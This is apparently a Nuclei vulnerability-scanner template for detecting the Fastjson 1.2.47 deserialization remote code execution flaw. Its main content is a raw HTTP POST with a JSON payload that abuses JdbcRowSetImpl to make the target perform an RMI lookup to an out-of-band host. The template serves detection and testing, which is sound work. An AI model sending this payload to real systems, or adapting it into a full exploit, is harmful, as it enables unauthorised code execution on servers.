id: fastjson-1-2-47-rce
info:
  name: Fastjson 1.2.47 - Remote Code Execution
  author: zh
  severity: critical
  description: Fastjson 1.2.47 is vulnerable to a deserialization remote code execution
    attack.
  reference:
  - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce
  - https://www.freebuf.com/vuls/208339.html
  - https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
  - https://github.com/wyzxxz/fastjson_rce_tool
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: rce,deserialization,oast,vulhub,fastjson
  metadata:
    impact: The vulnerability found in Fastjson 1.2.47 allowing for remote code execution
      could have a significant impact on the security and functionality of systems
      using this software.
    recommendation: It is recommended to update Fastjson to a version higher than
      1.2.47 to address the remote code execution vulnerability.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \  \"a\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\
    \n    },\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\
    \        \"dataSourceName\":\"rmi://{{interactsh-url}}/Exploit\",\n        \"\
    autoCommit\":true\n    }\n}\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    condition: and
    words:
    - Bad Request
    - '400'
